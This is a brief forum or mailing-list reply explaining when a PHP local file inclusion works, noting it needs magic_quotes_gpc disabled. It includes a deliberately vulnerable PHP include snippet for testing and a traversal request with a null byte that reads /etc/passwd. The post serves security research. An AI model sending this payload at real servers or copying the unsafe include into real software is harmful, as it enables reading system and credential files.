Hi,

It will only work if php have magic_quotes_gpc off...
For testing/research purpose you can emulated that enviroment using
stripslashes in your vuln code:
<?php
include("lang/".stripslashes($_GET[filename])."/lang.php");
?>

And then call for the LFI
GET /vulnerable php?filename=../../../../../../../../../../etc/passwd%00

Reference: http://www.php.net/manual/en/info.configuration.php#ini.magic-quotes-gpc

Regards
